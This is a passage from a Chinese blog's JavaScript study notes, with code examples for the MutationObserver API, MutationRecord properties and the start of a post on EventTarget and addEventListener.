<h3 id="2、MutationObserver-构造函数-使用方式"><a href="#2、MutationObserver-构造函数-使用方式" class="headerlink" title="2、MutationObserver 构造函数 (使用方式)"></a>2、MutationObserver 构造函数 (使用方式)</h3><p>使用时，<strong>首先使用<code>MutationObserver</code>构造函数，新建一个观察器实例，同时指定这个实例的回调函数。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(callback);</span><br></pre></td></tr></table></figure>

<p>上面代码中的回调函数，会在每次 DOM 变动后调用。该回调函数接受两个参数，第一个是变动数组，第二个是观察器实例，下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(<span class="keyword">function</span> (<span class="params">mutations, observer</span>) &#123;</span><br><span class="line">  mutations.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">mutation</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(mutation);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h3 id="3、MutationObserver-的实例方法"><a href="#3、MutationObserver-的实例方法" class="headerlink" title="3、MutationObserver 的实例方法"></a>3、MutationObserver 的实例方法</h3><h4 id="3-1-observe"><a href="#3-1-observe" class="headerlink" title="3.1 observe()"></a>3.1 observe()</h4><p><code>observe</code>方法<strong>用来启动监听，它接受两个参数。</strong></p>
<ul>
<li>第一个参数：所要观察的 DOM 节点</li>
<li>第二个参数：一个配置对象，指定所要观察的特定变动</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> article = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;article&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>  options = &#123; <span class="comment">// 配置对象，用于observer参数二，配置指定观察的特定变动</span></span><br><span class="line">  <span class="string">&#x27;childList&#x27;</span>: <span class="literal">true</span>, <span class="comment">// 子节点变动</span></span><br><span class="line">  <span class="string">&#x27;attributes&#x27;</span>:<span class="literal">true</span>, <span class="comment">// 属性变动</span></span><br><span class="line">  <span class="string">&#x27;characterData&#x27;</span>: <span class="literal">true</span> <span class="comment">// 节点内容或节点文本的变动</span></span><br><span class="line">&#125; ;</span><br><span class="line"></span><br><span class="line">observer.<span class="title function_">observe</span>(article, options);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>observe</code>方法接受两个参数，第一个是所要观察的DOM元素是<code>article</code>，第二个是所要观察的变动类型（子节点变动和属性变动）。</p>
<p>观察器所能观察的 DOM 变动类型（即上面代码的<code>options</code>对象），有以下几种。</p>
<ul>
<li><strong>childList</strong>：子节点的变动（指新增，删除或者更改）。</li>
<li><strong>attributes</strong>：属性的变动。</li>
<li><strong>characterData</strong>：节点内容或节点文本的变动。</li>
</ul>
<p>想要观察哪一种变动类型，就在<code>option</code>对象中指定它的值为<code>true</code>。需要注意的是，必须同时指定<code>childList</code>、<code>attributes</code>和<code>characterData</code>中的一种或多种，若未均指定将报错。</p>
<p>除了变动类型，<code>options</code>对象还可以设定以下属性：</p>
<ul>
<li><code>subtree</code>：布尔值，表示是否将该观察器应用于该节点的所有后代节点。</li>
<li><code>attributeOldValue</code>：布尔值，表示观察<code>attributes</code>变动时，是否需要记录变动前的属性值。</li>
<li><code>characterDataOldValue</code>：布尔值，表示观察<code>characterData</code>变动时，是否需要记录变动前的值。</li>
<li><code>attributeFilter</code>：数组，表示需要观察的特定属性（比如<code>[&#39;class&#39;,&#39;src&#39;]</code>）。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开始监听文档根节点（即&lt;html&gt;标签）的变动</span></span><br><span class="line">mutationObserver.<span class="title function_">observe</span>(<span class="variable language_">document</span>.<span class="property">documentElement</span>, &#123;</span><br><span class="line">  <span class="attr">attributes</span>: <span class="literal">true</span>, <span class="comment">// 属性变动</span></span><br><span class="line">  <span class="attr">characterData</span>: <span class="literal">true</span>, <span class="comment">// 节点内容或节点文本的变动</span></span><br><span class="line">  <span class="attr">childList</span>: <span class="literal">true</span>, <span class="comment">// 子节点的变动</span></span><br><span class="line">  <span class="attr">subtree</span>: <span class="literal">true</span>, <span class="comment">// 是否将该观察器应用于该节点的所有后代节点</span></span><br><span class="line">  <span class="attr">attributeOldValue</span>: <span class="literal">true</span>, <span class="comment">// 观察attributes变动时，是否需要记录变动前的属性值</span></span><br><span class="line">  <span class="attr">characterDataOldValue</span>: <span class="literal">true</span> <span class="comment">// 观察characterData变动时，是否需要记录变动前的值。</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>对一个节点添加观察器，就像使用<code>addEventListener</code>方法一样，多次添加同一个观察器是无效的，回调函数依然只会触发一次。如果指定不同的<code>options</code>对象，以后面添加的那个为准，类似覆盖。</p>
<p>下面的例子是观察新增的子节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> insertedNodes = [];</span><br><span class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(<span class="keyword">function</span>(<span class="params">mutations</span>) &#123;</span><br><span class="line">  mutations.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">mutation</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; mutation.<span class="property">addedNodes</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      insertedNodes.<span class="title function_">push</span>(mutation.<span class="property">addedNodes</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(insertedNodes);</span><br><span class="line">&#125;);</span><br><span class="line">observer.<span class="title function_">observe</span>(<span class="variable language_">document</span>, &#123; <span class="attr">childList</span>: <span class="literal">true</span>, <span class="attr">subtree</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>



<h4 id="3-2-disconnect-，takeRecords（）"><a href="#3-2-disconnect-，takeRecords（）" class="headerlink" title="3.2 disconnect()，takeRecords（）"></a>3.2 disconnect()，takeRecords（）</h4><p><code>disconnect</code>方法<strong>用来停止观察。调用该方法后，DOM 再发生变动，也不会触发观察器</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">observer.<span class="title function_">disconnect</span>();</span><br></pre></td></tr></table></figure>

<p><code>takeRecords</code>方法<strong>用来清除变动记录，即不再处理未处理的变动。该方法返回变动记录的数组</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">observer.<span class="title function_">takeRecords</span>();</span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存所有没有被观察器处理的变动</span></span><br><span class="line"><span class="keyword">var</span> changes = mutationObserver.<span class="title function_">takeRecords</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止观察</span></span><br><span class="line">mutationObserver.<span class="title function_">disconnect</span>();</span><br></pre></td></tr></table></figure>



<h3 id="4、MutationRecord-对象-变动记录"><a href="#4、MutationRecord-对象-变动记录" class="headerlink" title="4、MutationRecord 对象 (变动记录)"></a>4、MutationRecord 对象 (变动记录)</h3><p><strong>DOM 每次发生变化，就会生成一条变动记录（MutationRecord 实例）</strong>。该实例包含了与变动相关的所有信息。Mutation Observer 处理的就是一个个<code>MutationRecord</code>实例所组成的数组。</p>
<p><code>MutationRecord</code>对象包含了DOM的相关信息，有如下属性：</p>
<ul>
<li><code>type</code>：观察的变动类型（<code>attributes</code>、<code>characterData</code>或者<code>childList</code>）。</li>
<li><code>target</code>：发生变动的DOM节点。</li>
<li><code>addedNodes</code>：新增的DOM节点。</li>
<li><code>removedNodes</code>：删除的DOM节点。</li>
<li><code>previousSibling</code>：前一个同级节点，如果没有则返回<code>null</code>。</li>
<li><code>nextSibling</code>：下一个同级节点，如果没有则返回<code>null</code>。</li>
<li><code>attributeName</code>：发生变动的属性。如果设置了<code>attributeFilter</code>，则只返回预先指定的属性。</li>
<li><code>oldValue</code>：变动前的值。这个属性只对<code>attribute</code>和<code>characterData</code>变动有效，如果发生<code>childList</code>变动，则返回<code>null</code>。</li>
</ul>
<h3 id="5、应用示例"><a href="#5、应用示例" class="headerlink" title="5、应用示例"></a>5、应用示例</h3><h4 id="5-1-子元素的变动"><a href="#5-1-子元素的变动" class="headerlink" title="5.1 子元素的变动"></a>5.1 子元素的变动</h4><p>下面的例子说明如何读取变动记录。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> callback = <span class="keyword">function</span> (<span class="params">records</span>)&#123; </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(records) <span class="comment">// records参数是 MutationRecord实例</span></span><br><span class="line">  records.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">record</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Mutation type: &#x27;</span> + record.<span class="property">type</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Mutation target: &#x27;</span> + record.<span class="property">target</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [MutationRecord]</span></span><br><span class="line"><span class="comment">    0: MutationRecord</span></span><br><span class="line"><span class="comment">    addedNodes: NodeList [text]</span></span><br><span class="line"><span class="comment">    attributeName: null</span></span><br><span class="line"><span class="comment">    attributeNamespace: null</span></span><br><span class="line"><span class="comment">    nextSibling: null</span></span><br><span class="line"><span class="comment">    oldValue: null</span></span><br><span class="line"><span class="comment">    previousSibling: script</span></span><br><span class="line"><span class="comment">    removedNodes: NodeList []</span></span><br><span class="line"><span class="comment">    target: body</span></span><br><span class="line"><span class="comment">    type: &quot;childList&quot;</span></span><br><span class="line"><span class="comment">    __proto__: MutationRecord</span></span><br><span class="line"><span class="comment">    length: 1</span></span><br><span class="line"><span class="comment">    __proto__: Array(0)</span></span><br><span class="line"><span class="comment">    Mutation type: childList</span></span><br><span class="line"><span class="comment">    test.html:23 Mutation target: [object HTMLBodyElement]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> mo = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(callback);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> option = &#123;</span><br><span class="line">  <span class="string">&#x27;childList&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;subtree&#x27;</span>: <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">mo.<span class="title function_">observe</span>(<span class="variable language_">document</span>.<span class="property">body</span>, option);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>).<span class="property">textContent</span> = <span class="string">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>上面代码的观察器，观察<code>&lt;body&gt;</code>的所有下级节点（<code>childList</code>表示观察子节点，<code>subtree</code>表示观察后代节点）的变动。回调函数会在控制台显示所有变动的类型和目标节点。</p>
<h4 id="5-2-属性的变动"><a href="#5-2-属性的变动" class="headerlink" title="5.2 属性的变动"></a>5.2 属性的变动</h4><p>下面的例子说明如何追踪属性的变动。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> callback = <span class="keyword">function</span> (<span class="params">records</span>) &#123;</span><br><span class="line">  records.<span class="title function_">map</span>(<span class="keyword">function</span> (<span class="params">record</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Previous attribute value: &#x27;</span> + record.<span class="property">oldValue</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mo = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(callback);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;#my_element&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  <span class="string">&#x27;attributes&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;attributeOldValue&#x27;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mo.<span class="title function_">observe</span>(element, options);</span><br></pre></td></tr></table></figure>

<p>上面代码先设定追踪属性变动（<code>&#39;attributes&#39;: true</code>），然后设定记录变动前的值。实际发生变动时，会将变动前的值显示在控制台。</p>
<h4 id="5-3-取代-DOMContentLoaded-事件"><a href="#5-3-取代-DOMContentLoaded-事件" class="headerlink" title="5.3 取代 DOMContentLoaded 事件"></a>5.3 取代 DOMContentLoaded 事件</h4><p>网页加载的时候，DOM 节点的生成会产生变动记录，因此只要观察 DOM 的变动，就能在第一时间触发相关事件，也就没有必要使用<code>DOMContentLoaded</code>事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(callback);</span><br><span class="line">observer.<span class="title function_">observe</span>(<span class="variable language_">document</span>.<span class="property">documentElement</span>, &#123;</span><br><span class="line">  <span class="attr">childList</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">subtree</span>: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，监听<code>document.documentElement</code>（即网页的<code>&lt;html&gt;</code>HTML 节点）的子节点的变动，<code>subtree</code>属性指定监听还包括后代节点。因此，任意一个网页元素一旦生成，就能立刻被监听到。</p>
<h6 id="封装一个监听-DOM-生成的函数"><a href="#封装一个监听-DOM-生成的函数" class="headerlink" title="封装一个监听 DOM 生成的函数"></a>封装一个监听 DOM 生成的函数</h6><p>下面的代码，使用<code>MutationObserver</code>对象<strong>封装一个监听 DOM 生成的函数</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params">win</span>)&#123;</span><br><span class="line">  <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> listeners = [];</span><br><span class="line">  <span class="keyword">var</span> doc = win.<span class="property">document</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">MutationObserver</span> = win.<span class="property">MutationObserver</span> || win.<span class="property">WebKitMutationObserver</span>;</span><br><span class="line">  <span class="keyword">var</span> observer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ready</span>(<span class="params">selector, fn</span>)&#123;</span><br><span class="line">    <span class="comment">// 储存选择器和回调函数</span></span><br><span class="line">    listeners.<span class="title function_">push</span>(&#123;</span><br><span class="line">      <span class="attr">selector</span>: selector,</span><br><span class="line">      <span class="attr">fn</span>: fn</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span>(!observer)&#123;</span><br><span class="line">      <span class="comment">// 监听document变化</span></span><br><span class="line">      observer = <span class="keyword">new</span> <span class="title class_">MutationObserver</span>(check);</span><br><span class="line">      observer.<span class="title function_">observe</span>(doc.<span class="property">documentElement</span>, &#123;</span><br><span class="line">        <span class="attr">childList</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">subtree</span>: <span class="literal">true</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查该节点是否已经在DOM中</span></span><br><span class="line">    <span class="title function_">check</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 检查是否匹配已储存的节点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; listeners.<span class="property">length</span>; i++)&#123;</span><br><span class="line">      <span class="keyword">var</span> listener = listeners[i];</span><br><span class="line">      <span class="comment">// 检查指定节点是否有匹配</span></span><br><span class="line">      <span class="keyword">var</span> elements = doc.<span class="title function_">querySelectorAll</span>(listener.<span class="property">selector</span>);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; elements.<span class="property">length</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">var</span> element = elements[j];</span><br><span class="line">        <span class="comment">// 确保回调函数只会对该元素调用一次</span></span><br><span class="line">        <span class="keyword">if</span>(!element.<span class="property">ready</span>)&#123;</span><br><span class="line">          element.<span class="property">ready</span> = <span class="literal">true</span>;</span><br><span class="line">          <span class="comment">// 对该节点调用回调函数</span></span><br><span class="line">          listener.<span class="property">fn</span>.<span class="title function_">call</span>(element, element);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对外暴露ready</span></span><br><span class="line">  win.<span class="property">ready</span> = ready;</span><br><span class="line"></span><br><span class="line">&#125;)(<span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用方法</span></span><br><span class="line"><span class="title function_">ready</span>(<span class="string">&#x27;.foo&#x27;</span>, <span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>学习文档：<a target="_blank" rel="noopener" href="https://wangdoc.com/javascript/">https://wangdoc.com/javascript/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/pages/7d961b8030c6099e" data-id="cm2n1iusv000d9sr3dt3zhfa2" data-title="DOM" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-06.事件" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/pages/10b2761db5a8e089" class="article-date">
  <time class="dt-published" datetime="2020-01-12T03:49:16.000Z" itemprop="datePublished">2020-01-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E3%80%8AJavaScript%E6%95%99%E7%A8%8B%E3%80%8B%E7%AC%94%E8%AE%B0/">《JavaScript教程》笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/pages/10b2761db5a8e089">事件</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><h2 id="一、EventTarget-接口"><a href="#一、EventTarget-接口" class="headerlink" title="一、EventTarget 接口"></a>一、EventTarget 接口</h2><p> 事件的本质是程序各个组成部分之间的一种通信方式，也是异步编程的一种实现。DOM 支持大量的事件，本章开始介绍 <strong>DOM 的事件编程</strong>。 </p>
<h3 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h3><p><strong>DOM 的事件操作（监听和触发），都定义在<code>EventTarget</code>接口</strong>。所有节点对象都部署了这个接口，其他一些需要事件通信的浏览器内置对象（比如，<code>XMLHttpRequest</code>、<code>AudioNode</code>、<code>AudioContext</code>）也部署了这个接口。</p>
<p>该接口主要提供三个实例方法。</p>
<ul>
<li><code>addEventListener</code>：绑定事件的监听函数</li>
<li><code>removeEventListener</code>：移除事件的监听函数</li>
<li><code>dispatchEvent</code>：触发事件</li>
</ul>
<h3 id="2、EventTarget-addEventListener"><a href="#2、EventTarget-addEventListener" class="headerlink" title="2、EventTarget.addEventListener()"></a>2、EventTarget.addEventListener()</h3><p><code>EventTarget.addEventListener()</code>用于<strong>在当前节点或对象上，定义一个特定事件的监听函数</strong>。<strong>一旦这个事件发生，就会执行监听函数</strong>。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target.<span class="title function_">addEventListener</span>(type, listener[, useCapture]);</span><br><span class="line"><span class="comment">// 事件名称，监听函数 [，是否在捕获阶段触发]</span></span><br></pre></td></tr></table></figure>

<p>该方法接受三个参数。</p>
<ul>
<li><code>type</code>：事件名称，大小写敏感。</li>
<li><code>listener</code>：监听函数。事件发生时，会调用该监听函数。</li>
<li><code>useCapture</code>：布尔值，表示监听函数是否在捕获阶段（capture）触发（参见后文《事件的传播》部分），默认为<code>false</code>（监听函数只在冒泡阶段被触发）。该参数可选。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hello</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> button = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line">button.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, hello, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>button</code>节点的<code>addEventListener</code>方法绑定<code>click</code>事件的监听函数<code>hello</code>，该函数只在冒泡阶段触发。</p>
<p>关于参数，有两个地方需要注意。</p>
<p>首先，第二个参数除了监听函数，还可以是一个具有<code>handleEvent</code>方法的对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">buttonElement.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">handleEvent</span>: <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>addEventListener</code>方法的第二个参数，就是一个具有<code>handleEvent</code>方法的对象。</p>
<p>其次，<strong>第三个参数除了布尔值<code>useCapture</code>，还可以是一个属性配置对象</strong>。该对象有以下属性。</p>
<blockquote>
<ul>
<li><code>capture</code>：布尔值，表示该事件是否在<code>捕获阶段</code>触发监听函数。</li>
<li><code>once</code>：布尔值，表示监听函数是否只触发一次，然后就自动移除。</li>
<li><code>passive</code>：布尔值，表示监听函数不会调用事件的<code>preventDefault</code>方法。如果监听函数调用了，浏览器将忽略这个要求，并在监控台输出一行警告。</li>
</ul>
</blockquote>
<p>如果希望事件监听函数<strong>只执行一次</strong>，可以打开属性配置对象的<code>once</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// 只执行一次的代码</span></span><br><span class="line">&#125;, &#123;<span class="attr">once</span>: <span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure>

<p><code>addEventListener</code>方法可以为针对当前对象的同一个事件，添加多个不同的监听函数。这些函数按照添加顺序触发，即先添加先触发。如果为同一个事件多次添加同一个监听函数，该函数只会执行一次，多余的添加将自动被去除（不必使用<code>removeEventListener</code>方法手动去除）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hello</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, hello, <span class="literal">false</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, hello, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>执行上面代码，点击文档只会输出一行<code>Hello world</code>。</p>
<p>如果<strong>希望向监听函数传递参数，可以用匿名函数包装一下监听函数。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">print</span>(<span class="params">x</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>);</span><br><span class="line">el.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="title function_">print</span>(<span class="string">&#x27;Hello&#x27;</span>); &#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
